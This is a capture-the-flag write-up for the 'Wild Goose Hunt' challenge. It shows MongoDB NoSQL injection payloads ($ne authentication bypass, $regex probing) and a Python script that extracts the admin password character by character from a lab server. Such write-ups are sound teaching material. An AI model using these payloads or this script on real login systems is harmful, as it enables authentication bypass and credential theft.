<h2>Wild Goose Hunt</h2>

<blockquote>
  <p>Solved by : thewhiteh4t</p>
</blockquote>

<ul>
<li>We have a cool login page and source of the web app for this one</li>
<li>entrypoint.sh contains the following :</li>
</ul>

<p>```bash
    #!/bin/ash</p>

<pre><code># Secure entrypoint
chmod 600 /entrypoint.sh
mkdir /tmp/mongodb
mongod --noauth --dbpath /tmp/mongodb/ &amp;
sleep 2
mongo heros --eval "db.createCollection('users')"
mongo heros --eval 'db.users.insert( { username: "admin", password: "CHTB{f4k3_fl4g_f0r_t3st1ng}"} )'
/usr/bin/supervisord -c /etc/supervisord.conf
</code></pre>

<p>```</p>

<ul>
<li>we can see that the flag is being stored as the password of admin</li>
<li>we need to somehow extract the password</li>
<li>since its mongoDB first assumption was to check for NoSQL injection</li>
<li>Here is the error message we get in burp for a normal attempt</li>
</ul>

<p><img src="https://i.imgur.com/P2my3g3.png" alt="" /></p>

<ul>
<li>Lets switch to repeater here</li>
</ul>

<p><img src="https://i.imgur.com/miWWAps.png" alt="" /></p>

<ul>
<li>so we are getting a json response and the message is being displayed in the frontend</li>
<li>next i tried some basic payloads for NoSQL injection</li>
</ul>

<p><code>
username[$ne]=lol&amp;password[$ne]=lol
</code></p>

<p><img src="https://i.imgur.com/H6Da6q7.png" alt="" /></p>

<ul>
<li>Authentication bypassed! but we dont get any functionality in the frontend so i proceeded with more payloads</li>
</ul>

<p><code>
username=admin&amp;password[$regex]=A*
</code></p>

<p><img src="https://i.imgur.com/NCoQigL.png" alt="" /></p>

<ul>
<li>This is an interesting payload because we can use a wildcard to check if a particular character is present in the password or not! </li>
<li>we know that the flag is the password and flag begins with <code>CHTB{</code> so I tried that next</li>
</ul>

<p><code>
username=admin&amp;password[$regex]=CHTB{.*
</code></p>

<p><img src="https://i.imgur.com/6ya2cBg.png" alt="" /></p>

<ul>
<li>And it works again!</li>
<li>Now we can bruteforce characters and check for success message to get correct characters</li>
<li>I created a small python script for it</li>
</ul>

<p><code>python
    #!/usr/bin/env python3
    #################################
    ## Author    : thewhiteh4t ######
    ## Challenge : Wild Goose Hunt ##
    #################################
    import json
    import requests
    ip = '138.68.187.25'
    port = 31370
    url = f'http://{ip}:{port}/api/login'
    flag = 'CHTB{'
    charset = '_01234abcdefghijklmnopqrstuvwxyz'
    loop_iter = 1
    while flag.endswith('}') == False:
        for char in charset:
            if loop_iter == 1:
                payload = flag + char + '.*'
            else:
                payload = flag + '}'
            data = {
                'username': 'admin',
                'password[$regex]': payload
            }
            try:
                rqst = requests.post(url, data=data)
            except Exception as e:
                print(f'[-] Exception : {e}')
                exit()
            if rqst.status_code == 200:
                resp = rqst.text
                json_resp = json.loads(resp)
                status = json_resp['logged']
                if status == 1:
                    if payload.endswith('}') == False:
                        flag = payload.replace('.*', '')
                    else:
                        flag = payload
                        print(f'FLAG : {flag}')
                        exit()
                    print(f'FLAG : {flag}')
                    loop_iter = 0
                    break
            else:
                print(f'[-] Error : {rqst.status_code}')
        loop_iter += 1
</code></p>

<p><img src="https://i.imgur.com/6L20wKy.png" alt="" /></p>
